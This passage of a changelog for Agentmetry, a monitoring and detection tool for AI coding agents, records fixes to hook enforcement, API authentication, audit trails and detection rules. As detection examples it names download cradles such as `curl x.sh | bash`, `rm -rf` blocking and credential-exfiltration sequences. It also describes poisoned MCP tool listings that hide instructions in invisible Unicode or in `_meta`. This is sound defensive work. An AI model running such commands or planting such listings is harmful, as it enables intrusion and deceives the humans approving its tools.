  rather than wedging the feed. `/api/v1/audit/status` shows each sink's
  position and how long it has been failing. `agentmetry replay` now reads the
  trail instead of the removed runtime's empty outbox ([#209]).

- **Trail rotation** ([#101]). `agentmetry trail rotate`, or
  `AGENTMETRY_TRAIL_ROTATE_BYTES`, archives the active file into
  `<trail>.archive/` with a manifest. Records are untouched and the chain runs
  on across segments: `verify`, Merkle anchors taken before a rotation, the
  forwarder and replay all read every segment. Off by default, and nothing is
  ever deleted; why pruning is not in this release is in
  `docs/trail-retention.md`.

- **Microsoft Sentinel** (`AGENTMETRY_AUDIT_SINK=sentinel`), through the Logs
  Ingestion API with an Entra client-credentials token. The data collection
  rule is generated from the code's own column list, and every recorder rule
  has a KQL analytics rule (`docs/integrations/sentinel.md`,
  `docs/integrations/detections-sentinel.md`). Tested against the API
  reference; not yet run against a live workspace.

- **Hooks in the admin-managed locations.** `agentmetry hooks install
  --managed`, run as administrator, writes Claude Code's `managed-settings.d`
  drop-in, Cursor's enterprise `hooks.json` and Codex's `requirements.toml`,
  merging shared files and parsing every document before writing it. `--lock`
  also sets the vendors' managed-hooks-only switch. The paths follow the
  vendors' documentation as of 2026-10 and have not yet been confirmed on a
  real Intune device.

- **The MCP proxy ships in the package** as `agentmetry mcp-proxy [--server
  NAME] -- <server command>`. It used to exist only in a checkout, so a wheel or
  MSI install could not capture MCP at all. `tools/mcp_audit_proxy.py` stays as
  an alias for existing configs.

- **Keyed argument fingerprints.** A plain SHA-256 of a guessable argument can
  be confirmed by anyone with read access to the SIEM. With
  `AGENTMETRY_HASH_KEY` set (one value per fleet), the hook and the orchestrator
  use HMAC-SHA256 instead and say so in `input_redaction` (`hmac`,
  `hmac+command`). Unset, nothing changes. `doctor` warns on a fleet install
  without a key.

- **Machine-wide installs.** `AGENTMETRY_HOOK_SPOOL_PATH` gives user-context
  hooks a spool they may write to, and an `ingest-token` file, which the hook
  prefers, holds a credential that can send events and nothing else.
  Agentmetry Enterprise's installer provisions both.

- **Extension points for Agentmetry Enterprise:** who an event is recorded as,
  and signing forwarded events (`register_event_signer()`; with a signer, the
  forwarder sends `{"event", "signature"}` items and the trail is unchanged).

### Changed

- **The hook is about 30 percent faster.** Measured with `scripts/bench_hook.py`,
  one real hook process per sample on the maintainer's Windows machine: p50 366
  ms before, 254 ms after. The cost was an unused HTTPS context and proxy lookup
  on every loopback POST, plus imports the hook path did not need. The 100 ms
  target is not met; what it would take is in `SECURITY-HARDENING.md`.

- **One container that boots.** The image runs a single `agentmetry` service on
  127.0.0.1:8000 as a non-root user, with no qdrant, postgres, ollama or Gemini.
  Mounting the legacy MCP drivers at boot is opt-in
  (`AGENTMETRY_LEGACY_DRIVERS=1`).

### Security

- **The API required no authentication unless you configured it,** and
  `doctor` reported that as OK. Any local process, or a web page that got a
  request through, could read the trail, export evidence, inject events and
  close detections. The first start now writes a random token to
  `<data dir>/api-token`, readable by its owner only, and every route except
  `/api/v1/health` requires it. A test walks every route in the OpenAPI schema,
  so a route added later without auth fails CI. A disposition records who
  decided from how the request authenticated, never only from its body.
  `AGENTMETRY_AUTH_DISABLED=1` is the development override, and `doctor` fails
  if it is on while the API listens beyond loopback.

- **The dashboard compiled its API key into its JavaScript**
  (`NEXT_PUBLIC_AGENTMETRY_API_KEY`). It now signs in through a one-time link
  (120 seconds, single use) that sets an HttpOnly, SameSite=Strict session
  cookie; writes on that session need a custom header, and a WebSocket needs a
  loopback origin.

- **A DNS-rebinding page could read the API.** Requests whose `Host` is not
  localhost, 127.0.0.1, ::1 or a name in `AGENTMETRY_TRUSTED_HOSTS` are now
  refused.

- **`serve.bat` listened on every interface.** It binds loopback unless
  `AGENTMETRY_BIND` says otherwise.

- **Data lived inside `site-packages`,** where `pip uninstall` or a rebuilt
  venv deletes the evidence. It now resolves to `AGENTMETRY_DATA_DIR`, the
  installer's data root, the checkout, or the per-user data directory, in that
  order.

- **The orchestrator rewrote your IDE hook files at every start.** It no longer
  touches `~/.cursor/hooks.json` or Claude settings unless asked (see Upgrading).

[#101]: https://github.com/blitzcrieg1/agentmetry/issues/101
[#220]: https://github.com/blitzcrieg1/agentmetry/pull/220

## [0.9.2] - 2026-10-03

The release that lets a fleet send its record somewhere other than its own SIEM.
The webhook sink can authenticate, so a hosted collector can tell one machine's
events from another's, and the MCP servers each machine's agents are wired to
can be sent as an opt-in inventory event. Also the fix for installed machines
that still recorded every operator as `local`.

The detection ruleset is unchanged.

### Added

- **The webhook sink can authenticate** (`AGENTMETRY_AUDIT_WEBHOOK_TOKEN`). When
  set, every webhook POST carries `Authorization: Bearer <token>`, in canonical
  and CloudEvents shapes alike. This is the sensor-side piece of hosted ingest:
  a cloud that binds tenant and host to a token needs the header to exist.
  Unset stays unset: an existing webhook keeps receiving unauthenticated
  requests, byte for byte.

- **Herdr is a verified capture environment** ([#216]). [Herdr](https://herdr.dev)
  hosts coding-agent terminals in a persistent runtime, and because it runs the
  agent CLIs unchanged, the existing hook path captures what runs inside it.
  Verified end to end on Windows: a Herdr pane process carries
  `HERDR_ENV=1` with pane, tab and workspace ids, and the production hook
  client executed from that pane posted to the orchestrator and landed on the
  hash-chained trail. Role/workspace tagging and a cross-agent orchestration
  adapter (agent prompts agent, a sequence no current rule can see) are scoped
  in the same issue.

- **The MCP inventory can reach the SIEM** (#169, part 1). `agentmetry mcp`
  answered "what are the agents wired to" only for whoever ran it, on that
  machine. With `AGENTMETRY_MCP_INVENTORY=1`, the recorder emits an
  `mcp_inventory` event at startup, whenever the configured surface changes
  (`outcome: changed`), and once a day (`outcome: snapshot`), so a fleet view
  over 24 hours sees every host.

  Off by default, and deliberately not part of the heartbeat. The heartbeat goes
  to every sink on every install and commits to the MCP surface by digest alone,
  and two tests say why: recording your own laptop should not ship your tool
  inventory to a SOC. They still pass, with the inventory turned on.

  Each server goes out as agent, name, scope, transport, launcher, the package
  name for a fetch-and-run launcher (`npx`, `uvx`), the URL's host (`url_host`, so it never collides with a SIEM's own `host`), its findings
  as codes (`unpinned_fetch`, `auto_confirm`, `plaintext_http`, `no_command`),
  and a fingerprint. Arguments, env keys and values, and the rest of the URL
  are withheld: they are where tokens and home paths live. The fingerprint
  commits to all of it, so a changed argument still changes the entry. A test
  plants a token, a home path, an env key and value, and a URL query key, and
  checks none of them leaves.

  Part 2 of #169, fingerprinting `tools/list` for servers nobody wrapped with
  the proxy, is separate.

### Fixed

- **An installed machine still recorded every operator as `local`.** Both
  `.env.example` files shipped `AGENTMETRY_OPERATOR_ID=local`, and
  `install.ps1` and `install.sh` copy the example to `.env`. Since 0.9.1 a
  configured id overrides the OS account, so on any machine set up by an
  installer the placeholder won and the attribution fix in 0.9.1 did nothing:
  the hook sent `local` as configured, and the orchestrator's own setting
  pinned it again.

  The examples now ship it empty, with a comment saying what empty means. A
  configured `local` is read as not set, by the hook, the orchestrator and the
  `disposition` CLI alike, so machines that already copied the old example are
  fixed without anyone editing their `.env`. A real configured id still wins.
  The regression test builds that installed state, `local` in both places, and
  checks the event names the OS account.

- **The README described commands that did not work and a product that has
  moved on.** An audit of the README against the code on 2026-10-02 found:
  `python -m cli benchmark`, the documented way to check the detection claims,
  fails with "No module named cli" since the package became `agentmetry`; the
  dashboard needs Node 20.9 or newer, not 18; `agentmetry replay` was listed as
  an audit-trail timeline while it reads only the removed runtime's outbox, so it
  shows nothing for a hook or OTel session ([#209]); the example event was a
  runtime-era `vault_fs.read_file` call, now a real Claude Code event generated
  from the code; the tool-policy section still said a deny returns
  `permission: deny`, which Claude Code ignores; and the approvals paragraph
  said no agent reports the human's click, which Claude Code's OTel stream now
  does. The agent list, capture paths, SIEM lists and contributing paths are
  brought in line with what ships. `ROADMAP.md` is refreshed from commands: it
  still listed 0.7.0, a dogfood gate at 0 of 4 with an earliest-close date, four
  false-positive fixes that shipped in 0.7.0, and OTel ingest as future work.

[#209]: https://github.com/blitzcrieg1/agentmetry/issues/209

### Changed

- **Dashboard dependencies: all 20 open Dependabot alerts cleared** (#211),
  including a critical in `next` (16.3.4 to 16.3.6) and five high in `undici`
  and `brace-expansion`. The patch-and-minor group plus `npm audit fix` without
  `--force`; `npm audit` reports 0 vulnerabilities.
- **The open-source sensor stays local-first; Agentmetry Enterprise may be
  hosted** (#215). ROADMAP and the open-core split no longer rule out a vendor
  console for Enterprise. The sensor never depends on a hosted service.

## [0.9.1] - 2026-10-02

Two fixes to things every tool call touches. The trail now says who ran the
agent: every event before this said `local`, including on machines where an
operator id was configured, because the hook sent `local` and the orchestrator
kept a client's value over its own. And the hook is
about 40% faster, because it no longer imports pydantic to read five settings.

Events now carry the OS account, or `AGENTMETRY_OPERATOR_ID` if set, in the
trail and in anything you forward. Set it to a pseudonym if account names
should not reach your SIEM.

The detection ruleset is unchanged, so the dogfood clock keeps running.

### Fixed

- **The hook cost 626 ms on every tool call, and a third of it was pydantic**
  (#171). The hook runs in front of each tool call, and on a blocking hook the
  agent waits for it. The DLP scanner and the tool-policy evaluator imported
  `core.config` to read five settings, and that import brought pydantic and
  pydantic-settings with it: about 220 ms, on every call, to learn two modes,
  two manifest paths and one boolean.

  They now read those five through `core/audit/policy_settings.py`, which is
  standard library only. Where `core.config` is already loaded, in the
  orchestrator and the test suite, it reads the real `settings` object, so
  nothing there changes. In the hook it resolves them the way `Settings` does:
  environment first, case-insensitively, then the orchestrator's `.env`, then
  the same defaults. A test checks the two resolvers agree across environment
  and `.env` forms. The manifests are also parsed with libyaml where it is
  installed, which produces the same objects and saved about 16 ms more.

  Measured on the maintainer's machine, seven cold runs each against a stub
  ingest server: a median of 626 ms before, 376 ms after. Importing the hook
  went from about 420 ms to about 206 ms. A bare interpreter is about 74 ms of
  what is left. The figure depends on the machine and is not pinned. What is
  pinned is the cause: `test_hook_import_cost.py` fails if pydantic or
  `core.config` lands on the hook's import path again, or if any third-party
  module beyond YAML does.

  A proposal attributed this to interpreter startup and suggested rewriting the
  hook in a compiled language. The measurement put the interpreter at under a
  quarter of it, and the fix is one import.

  Every enforcement test had run the hook in-process, where `core.config` is
  loaded, so none of them exercised the path a real hook takes.
  `test_hook_real_process.py` runs the hook as Claude Code does, as a separate
  process against a stub server, and checks block mode still denies `rm -rf`
  and an AWS key. With the new resolver made to ignore the environment, two of
  its four tests fail.

- **The trail could not say who ran the agent, and configuring it did nothing**
  (#168). Every event recorded the operator as `local`. The hook hardcoded
  `"operator_id": "local"` in twenty-four payloads, and the orchestrator keeps
  any value a client sends, so `AGENTMETRY_OPERATOR_ID` never reached a single
  hook event even when it was set. On the maintainer's machine, with it set,
  2,620 of the last 3,761 hook events said `local`. A hash-chained, anchorable
  trail could prove a record was not altered and could not say who it was
  about.

  The hook now resolves the account itself, because it runs as the developer
  and the orchestrator, under a fleet service, may not: `AGENTMETRY_OPERATOR_ID`
  if set, else the OS account, domain-qualified on Windows (`CORP\jdoe`, not
  `jdoe`; a local account's machine name is dropped). It is stamped at capture,
  so a spooled event keeps the account that captured it. On the orchestrator,
  `AGENTMETRY_OPERATOR_ID` overrides what a hook read from the OS, and its own
  account is the last fallback before `local`. Hooks up to 0.9.0 still send
  `local`, which now counts as not stated.

  Every event says who resolved the id in `initiator.operator_source`
  (additive; schema stays 1.2.0). `hook_os`, `hook_configured` and `client` are
  what the capture surface claimed, `orchestrator_configured` and
  `orchestrator_os` what the recorder worked out. The README's identity
  paragraph said ingest takes no identity from the caller. It takes no machine
  identity, which is unchanged, and now says it takes one claim about the
  person, labelled as one. A client could already set `initiator.operator_id`;
  the guard test only checked top-level field names.

  Triage records had the same hole: `decided_by` was an empty string with
  nothing configured. The `disposition` CLI now sends the account running it,
  and the event falls back to the resolved operator.

  **This puts account names in the trail and in forwarded events**, where
  before there was a constant. That is the point of the change, and it is new
  data leaving the machine for anyone who forwards. To keep account names out
  of a SIEM, set `AGENTMETRY_OPERATOR_ID` to a pseudonym. Nothing reads another vendor's
  credential store to find an email: an earlier proposal did, and #168 explains
  why not.

  This is attribution by claim. Making it a fact on a fleet is per-host
  signing, which is separate work.

## [0.9.0] - 2026-10-02

Enforcement release. A deny on Claude Code, the agent this records most, had
never denied anything: every agent but one was sent Cursor's reply format, which
Claude Code ignores, and the trail recorded the call as blocked while it ran.
Nothing in the suite could see it, because the tests asserted what the hook
printed, not what the agent did with it.

Also two new ways in. A policy rule can now ask a human, on the hooks where an
ask is known to reach one and as a deny everywhere else. And Claude Code can be
recorded with no hooks at all, from its own OpenTelemetry stream.

The detection ruleset is unchanged, so the dogfood clock keeps running.

### Fixed

- **A deny on Claude Code never denied anything, and the trail said it had.**
  Every agent except Antigravity was sent Cursor's hook format,
  `{"permission": "deny"}`. Claude Code does not recognise a top-level
  `permission` key; its `PreToolUse` decisions live under
  `hookSpecificOutput.permissionDecision`. So it read the exit-0 hook as
  success and ran the tool. The hook had already written that same call to the
  trail as `outcome: denied`.

  That covers both enforcement paths: DLP `block` mode and tool-policy `block`
  mode, plus the `AGENTMETRY_ENFORCE` override. On Claude Code, every block any
  release has reported was a tool that ran. It is the failure `policy.py`
  describes as the worst one possible, a lie in the tamper-evident record, and it
  shipped because three tests ran as `claude` and asserted the Cursor string. A
  substring match cannot tell a format the agent honours from one it ignores, so
  the suite certified it.

  The hook now encodes each decision in the shape the calling agent enforces,
  per its vendor documentation: `hookSpecificOutput.permissionDecision` for
  Claude Code `PreToolUse`, `hookSpecificOutput.decision.behavior` for
  `PermissionRequest`, unchanged top-level `permission` for Cursor, and
  unchanged `decision` for Antigravity. The reason that fired, such as
  `dlp:aws_key` or `tool_policy:block_shell_rm`, now reaches the agent with the
  deny.

  `PermissionRequest` has no `ask` outcome, so an ask there becomes deny. That
  is the only safe direction for a control, never the other way.

  Qwen, Qoder, CodeBuddy and Kimi get the same encoding, because the installer
  sets them up with Claude's hook protocol. Only Claude Code has been checked
  against its vendor's published schema; the others inherit it unverified.
  Codex is not in that set and still gets the Cursor format. It registers
  Claude-style event names, so it may have had the same bug, and that needs
  checking against Codex's own docs before anyone relies on a deny there.

  `test_hook_decision_format.py` parses each output and asserts the documented
  schema per agent. Against the old emitter, 18 of its 19 tests fail.

- **An unrecognised policy value failed open.** A rule with an action the
  loader did not know was dropped, so a rule the operator wrote silently did
  nothing, and an unrecognised `default` became `allow`. Writing `action: ask`
  before this release did nothing at all, and writing `default: ask` allowed
  everything. Both now load as `deny` with a warning naming the value. The
  shipped manifest is unaffected: it is `default: allow` with eight valid `deny`
  rules.

- **Running the test suite repointed your IDE hooks at the checkout you ran it
  from.** The orchestrator's startup installs Claude Code and Cursor hooks into
  the home directory on every boot, and three tests boot the app inside its
  lifespan. `conftest.py` isolated the audit trail but not the home directory,
  so `pytest` from any clone rewrote the developer's real
  `~/.claude/settings.json` and `~/.cursor/hooks.json` to point at that clone.
  Their live Claude Code and Cursor sessions then ran hooks out of whatever the
  checkout held, including an unmerged feature branch, with nothing to say so.

  It was found from the hook config's modification time, one minute after a
  test run on the maintainer's machine, where it had been treated as a machine
  quirk with a manual restore procedure. It was never machine-specific: any
  contributor who cloned the repo and ran the suite got the same thing.

  A new autouse fixture points `HOME` and `USERPROFILE` at a temp directory and
  removes `QWEN_HOME`, the one installer override that bypasses `Path.home()`.
  `test_suite_leaves_real_home_alone.py` boots the real app and checks the hooks
  land in the temp home. Verified on the affected machine: before the fixture a
  full run rewrote both configs, after it the same run left them byte-identical.

### Added

- **A policy rule can ask** (phase A of the ask-gate). `action: ask` joins
  `allow` and `deny`, and on a pre-execution hook it makes the agent show its own
  approval prompt. An `approval_request` naming the rule is recorded before the
  prompt. What the human then decides arrives as it does today, as the call
  running or not, and is still flagged `inferred:*`, because no agent reports the
  click. Recording the decision itself is phase B.

  Precedence is most restrictive first: deny, then ask, then allow. A specific
  ask rule still prompts when a broader allow also matches, which is the point of
  writing one.

  **An ask is only trusted where it is known to reach a human.** That is Claude
  Code `PreToolUse` and Cursor `beforeShellExecution` and `beforeMCPExecution`,
  each checked against the vendor's hook documentation. Everywhere else it is
  enforced as deny, because an ask the agent does not recognise is read as no
  decision at all, and the tool runs. Two of those are documented, not guessed:
  Cursor says an ask on `preToolUse` is "accepted by the schema but not enforced
  today", and Claude Code's `PermissionRequest` takes allow or deny only. The
  rest, including Qwen, Qoder, CodeBuddy and Kimi, are unverified. A degraded ask
  is recorded as `denied` with `ask_unsupported:<agent>/<hook>` in the reason, so
  it shows in the trail and not only in `doctor`. The matrix lives in
  `tool_policy/capability.py`, and its import falls back to denying every ask.

  `agentmetry doctor` says where your ask rules will prompt, and warns when tool
  policy is not in `block` mode, since then they are recorded and never fire.

  Not a global mode. `default: ask`, meaning ask about everything not
  allowlisted, needs phase B's timeouts to be safe, because an agent that never
  shows the prompt would otherwise stall every call.


- **Linux/macOS one-flow install**: `scripts/install.sh` mirrors `install.ps1`
  (venv, Python + dashboard deps, `.env` from the example, IDE hooks,
  `doctor --fix`) with POSIX flags (`--skip-hooks`, `--skip-dashboard`,
  `--no-doctor`, `--tool-policy-block`, `--dlp-block`). Hooks are written by
  `agentmetry hooks install`, the cross-platform installer, so coverage on
  Linux/macOS is the seven-agent set rather than the two the PowerShell pair
  writes. `scripts/start-dev.sh` / `scripts/stop-dev.sh` replace
  `start-dev.bat`; both processes background with logs under
  `apps/orchestrator/data/logs/`.
- **`agentmetry otel`: Claude Code's native OpenTelemetry stream, recorded
  with no hooks installed.** A loopback OTLP/HTTP JSON receiver, now in the
  package (`core/audit/otel_ingest.py`). Claude Code's telemetry docs leave
  anomaly detection, correlation and alerting to the backend, and this is that
  backend's front door. Each event goes through the hook client's own
  enrichment and `post_ingest`, so it gets the same argument hash, traits, MITRE
  and ATLAS labels, and the same spool when the orchestrator is down. A test
  checks that one Bash call produces the same tool fields on both paths.
  `--print-env` prints what to start Claude Code with, `--print-mapping` what is
  mapped and why, and `AGENTMETRY_OTEL_PORT` sets the port. It binds 127.0.0.1
  only. `scripts/otel_receiver.py` is now a shim that keeps the prototype's
  flags working.

  **The prototype did not work on the stream Claude Code sends.** It landed
  after 0.8.0 and was never released. Its entry here said a
  credential-read-then-egress sequence fired `credential-exfil` end to end. That
  was true of the test payloads, which carried arguments as objects and
  `success` as a boolean. Claude Code documents both as strings. Replayed on a
  session in the documented format, the prototype recorded a failed call as a
  success (`bool("false")` is true), labelled no traits, gave every call the
  same hash (of `{}`), and fired nothing. The new fixture is in that format, and
  `credential-exfil` fires on it, through the CLI, as critical.

  What is mapped, and what is held back on purpose:

  - `tool_result` becomes `tool_called` or `tool_failed`. Arguments are read
    from `tool_input`, which needs `OTEL_LOG_TOOL_DETAILS=1`. Without it the
    event carries no hash rather than a hash of nothing.
  - `tool_decision` becomes an `approval_response` only when a person said yes.
    A `config` or `hook` decision is not a human approval and is counted, not
    recorded as one. A person's no is also counted, not forwarded:
    `approval-denied-then-executed` binds a denial to the later call by
    argument hash, and this event has no arguments, so it would match every
    later call of the same tool, the false positive 0.7.0 removed. Binding on
    `tool_use_id` is a rule change and waits for the detection freeze to end.
  - `mcp_server_connection` maps to `mcp_schema` only with a fingerprint, which
    Claude Code's documented event does not carry. In practice it is counted.

  The 23 documented types with no canonical home are counted by name, the
  input to schema v1.3. An undocumented type is counted separately. Prompts,
  responses and error text are never forwarded. A protobuf export gets a 415
  that says to switch to `http/json`, and gzip is accepted.

  It reports what happened, after it happened, so it enforces nothing. Use it
  or the Claude Code hooks for a given install, not both: each records every
  tool call, so running both records each one twice.

### Changed

- **CI runs the Linux installer on a clean runner.** Nothing in CI ran
  `scripts/install.sh`, and 0.7.0's Windows installer shipped unparseable by
  the documented PowerShell, which a contributor found on a clean machine. The
  new `install-linux` job runs the installer as a new user would, checks
  `doctor` reports no failure, then installs the Claude Code hook and executes
  it with no orchestrator running, because the hook must spool and exit 0
  rather than block the agent.

## [0.8.0] - 2026-09-19

Contributor release. Three people outside the project sent code, and the most
valuable thing they sent was the discovery that Agentmetry did not install on a
clean Windows machine at all. That had been true, undetected, through four
releases, because the test suite runs in an environment that is already correct.

Also the first detection that fires on a server nobody has ever seen before.
Everything else in the MCP module compares against a baseline, which is silent
about a server that arrived hostile.

### Added

- **Concealed Unicode in MCP tool listings is detected on first sighting**
  ([#152], [#154]). A tool description can carry characters that render as
  nothing: the Unicode TAG block, zero-width joiners, bidi overrides. The human
  approving the tool reads one string and the model receives another, which
  research calls an approval-view fidelity gap.

  This catches one narrow class on a single observation, which the fingerprint
  cannot do at all. That limit is worth stating precisely, because "blind on the
  first listing" understates it: the fingerprint answers "did this move", never
  "should this have been here". A server hostile at its first release that never
  changed has a stable digest forever and is never flagged by it. It does not
  make a clean listing trustworthy either, first or otherwise: an instruction
  written in ordinary visible text needs none of these characters and is
  invisible to this check.

  The check is contextual, because every one of these ranges has a legitimate
  use. An earlier draft of this module said in a comment that they did not, and
  a reader on r/mcp took that apart within a day of the release being cut. The
  Scotland and Wales flags are emoji tag sequences. Every family and profession
  emoji carries a zero-width joiner. ZWNJ is required Persian and Arabic
  orthography rather than decoration, so flagging it penalises correctly written
  non-Latin text. All three fired on the first implementation.

  So a tag character inside a well-formed flag sequence, a ZWJ between two
  emoji, a ZWNJ beside a script that uses it, and a bidi control in text that
  actually contains a right-to-left script are all silent, while TAG-encoded
  ASCII with no flag base in front of it is still counted, including when it
  trails a real flag. Those benign shapes are now fixtures that must stay
  silent, which is the same rule the detection benchmark already follows.

  Two grades, under separate keys ([#186]). `U+200B`, `U+00AD` and `U+FEFF`
  were counted as concealment until the same reader was asked whether they had
  innocent uses too. They do: a line-break opportunity, a soft hyphen and a
  legacy no-break space, all of which arrive in descriptions imported from
  formatted documentation. Unlike a ZWJ nothing neighbouring them settles the
  question, so they report as `formatting` and a listing carrying only those
  produces no `concealed` field at all.

  Counts per category, never the text. A finding that carried the payload would
  be a poisoned instruction copied into the trail and then forwarded to a SIEM.
  The private use area is deliberately excluded: icon fonts use it legitimately
  and a category that cries wolf costs more than the one case it might catch.
  The scan walks every string in a tool definition rather than a named list of
  fields, because a property description nested in `inputSchema` is exactly what
  an allowlist misses.

- **`agentmetry detections <correlation_id>`** ([#100], [#139], thanks
  [@hossainzarif23]). Lists the detections for one session, so triage does not
  require the dashboard. It reports a disabled audit export as a distinct state
  with a non-zero exit rather than as an empty list, because "no findings" and
  "nothing was ever recorded" are different answers and only one of them is
  good news.

- **`agentmetry disposition <correlation_id> <rule_id>`** ([#140], thanks
  [@kkkhs]). Closes a detection as `resolved`, `false_positive` or
  `risk_accepted`, with a note and a decider. Dispositions are an index over
  `detection_disposition` events in the trail, which remain the record.

- **`scripts/agentmetry_identity_enrich.py`** ([#167]). Classifies a JSONL
  stream by email domain and licence context, for operators who need to tell a
  personal account from a corporate one. It never touches `event` or `trail`,
  because the trail is hash chained and a field added inside `event` invalidates
  that record and every record after it.

- **An OWASP Agentic Skills Top 10 coverage mapping** ([#149]), stating which of
  AST01 to AST10 this project covers, which it partially covers, and which it
  does not cover at all.

- **`funding.json`** ([#157], [#158], [#162]), a v1.1.0 funding manifest.

### Fixed

- **Agentmetry did not install on a clean Windows machine** ([#133], [#137],
  [#138], [#141], all three found by [@hossainzarif23]). Three separate bugs,
  each of which alone would have stopped a new user:

  The documented PowerShell command could not parse `install.ps1`, because the
  file had no UTF-8 BOM and contained an em-dash, which PowerShell 5.1 reads as
  a syntax error. Every `.ps1` in `scripts/` now carries a BOM and none contains
  an em-dash.

  The hook installers invoked the global `python` rather than the project venv,
  so hook installation failed on any machine where the two differed. They now
  prefer `apps\orchestrator\.venv\Scripts\python.exe`.

  `install.ps1` ignored the exit code of every hook installer and printed
  "Install complete" regardless. It now checks `$LASTEXITCODE` after each one.
  This is the worst of the three: a reported success after a silent failure
  leaves an operator believing they have a recorder when they have nothing.

  An unconstrained `mcp>=1.2` also resolved to 2.x on a fresh install, which
  removed the import path the bundled `vault_fs` server uses. Pinned to `<2`
  until that server is ported.

- **`_meta` was stripped before hashing, so text moved there bypassed the
  rug-pull digest entirely** ([#142], [#144]). A poisoned tool listing hashed
  identically to a clean one, both `4b40e8ff9183c727`. `_meta` is model-visible
  and was exempt from the very check meant to notice it moving. The volatile-key
  exemption is now empty, and `FINGERPRINT_VERSION` migrates stored baselines so
  a version bump is not read as a server change.

- **A re-baseline was indistinguishable from a first sighting** ([#146],
  [#147]). The migration above quietly re-baselined every stored server, which
  would hide a server that was already poisoned when the baseline was taken.
  A version mismatch now reports `rebaselined`, not `new`.

  The test shipped with [#144] asserted the wrong outcome, pinning the bug in
  place. That is worth recording: a test can hold a defect still as easily as it
  can catch one.

- **`agentmetry stats` told operators to set `AGENTMETRY_AUDIT_EXPORT`**
  ([#160]), which does not exist. The only alias is
  `AGENTMETRY_AUDIT_EXPORT_ENABLED`. An operator who hit a disabled export
  followed the instruction, set something inert, saw the trail stay empty, and
  had nothing to tell them why. Found only because [#139] added the same message
  to a second command and named the variable correctly.

  `test_cli_env_var_names.py` now walks every string the CLI prints and asserts
  each `AGENTMETRY_` name it mentions is one the settings actually declare.

- **`CONTRIBUTORS.md` published numbers its own printed command did not produce**
  ([#159]). It advertised 382 of 511 commits beside a `git log` invocation that
  prints neither, because the figures were counted across every ref rather than
  `master` and included a local backup branch nobody else has. A reviewer
  running the published command on their own clone got a different answer with
  nothing to explain the gap. Corrected, with the correction written into the
  file rather than quietly applied.

- **The README overstated its own rule count** ([#150]) and the site repeated
  it, both saying fifteen built-in rules where fourteen ship.

### Changed

- The detection freeze dates in `CLAUDE.md` were wrong in both directions within
  a week ([#132], [#173], [#179]). That file no longer states an earliest close
  date at all; it states the command that prints one. A week scored red on
  untriaged detections turns out to be rescuable at any time, because the
  verdict is recomputed from the disposition store on every run rather than
  frozen when the week ends, and two documents here asserted the opposite.

- Dashboard moved to Next 16 and vitest 5.

### Known limitations, unchanged

- The MCP proxy is still stdio only. Remote Streamable-HTTP and SSE servers are
  not seen ([#148]).
- A server added to a config file but not wrapped with the proxy is invisible
  ([#169]).
- Every event still records `operator_id` as `local` unless one is configured
  ([#168]), so the trail cannot say who ran the agent.
- An unattended auto-mode session is indistinguishable from a supervised one
  ([#170]).


## [0.7.0] - 2026-08-27

Honesty release. Two published claims were false on the live path and four
known false positives were shipping under a freeze. All six are fixed, and the
detection freeze was broken deliberately to do it, so the four-week dogfood
clock restarts from this tag.

### Fixed

- **The 0.6.0 MCP fields never survived HTTP ingest.** `ExternalIngestBody`
  declared `schema_fingerprint` and `schema_tool_count` and nothing else, and
  pydantic ignores unknown keys silently. So `schema_tool_digests`,
  `server_version`, `list_changed` and `initiator` were computed by the proxy,
  POSTed, and discarded at the boundary. A schema move could only ever name the
  server, never the tool.

  The tests passed because they call the ingest functions with a dict and never
  cross the model. That is the second time this exact failure has shipped from
  this file: `tool.traits` and `tool.mitre` went the same way, which made
  hashed-only events invisible to every command rule. So the fix is a
  structural guard rather than four more fields. `test_ingest_roundtrip.py`
  builds payloads with the real proxy builders and fails if any key does not
  survive the model.

  `initiator` is opened with `actor_type` constrained to a known set and
  coerced down to `agent`, never up: `human` resets approval gates and
  `autonomous` is what a rule keys on, so an unrecognised string must not land
  on either. Identity is unchanged, and a test pins that a client still cannot
  assert `host_id` or `fleet_id`.

- **`.env.example` was credential access** (#44). Six of seventeen week-one
  dogfood findings, every one a critical. It is the file you commit *instead*
  of a credential file, and reading it is day one in any repository. A bare
  `.env` and `.env.local` still map to credential access.

- **A pipe into an interpreter running its own script was a download cradle**
  (#50). `curl api/x.json | python -c 'json.load(sys.stdin)'` is a data
  pipeline: the interpreter was handed its own program and never executes the
  download. Cradles without an inline script, `curl x.sh | bash` and
  `curl x.py | python`, still fire critical, and local staging then execution
  still records at low.

- **Any staging-host fetch followed by any `python -c` was critical staging**
  (#51), with nothing linking the two. GitHub raw serves documentation as well
  as payloads, and a fetch that only printed staged no artifact for a later
  command to run. The bound form, where the file downloaded is the file
  executed, is untouched.

- **A credential path named inside a structured tool argument read as a
  credential access** (#49), the sibling of #44. Structured arguments have no
  shell quoting to mask, so a path mentioned in an MCP message was mapped to
  T1552. Path rules now skip free-text argument values. The same path arriving
  in a `path` argument is still a read.

### Changed

- **`autonomous-unapproved-write` leaves the published set.** It keys on
  `initiator.actor_type == "autonomous"`. The bus and SDK paths produce that,
  so the rule is correct and stays registered. No IDE capture surface produces
  it: across roughly 32,000 events of real traffic from five agent surfaces the
  actor is `human`, `agent` or `system` and never once `autonomous`.

  It was counted in "fifteen detection rules", exported to Sigma at severity
  high, and named in the pitch as the flagship no-default-self-approve story. A
  published rule that cannot fire is a claim, not a detection. It is now
  `EXPERIMENTAL_RULE_IDS`: registered, uncounted, undocumented in the published
  table, and not exported.

  **Fourteen published rules, one experimental.** The Sigma pack is fifteen
  files for fourteen ids, because `encoded-command-download` still splits by
  severity.

- **The benchmark corpus carries the false positives it claims to have none
  of.** 54 cases, 26 attack and 28 benign, up from 50. The four shapes above
  are in it as tagged benign, so a regression fails CI. "0 false positives" now
  means something it did not mean in 0.6.0, when the corpus simply did not
  contain the cases that were known to fail.

- **The detection freeze is broken and the dogfood clock restarts.** The
  ruleset fingerprint moves from `56ad3de1ad8533cf` to `15846a0915769d4a`. Four
  consecutive green weeks are measured from this tag. Shipping criticals on
  `.env.example` to the first external tester was the more expensive of the two
  options.

- The supply-chain CI job audits the dependency set rather than the
  environment. `pip-audit --strict` was asking PyPI whether the version about
  to be published was already published, and failing every version bump.

## [0.6.0] - 2026-08-24

Most of this release came from strangers. The MCP schema work was posted to
r/mcp for review, six people took the design apart, and seven issues were filed
against this project as a result. Three of them are fixed below.

### Added

- **The fifteen sequence detections ship as Sigma rules.** The Sigma pack
  already in `docs/integrations/sigma/` covered the recorder's own health:
  heartbeat silence, degraded coverage, MCP schema drift, denial bursts,
  untriaged criticals. All useful, and none of it the product. A Splunk or
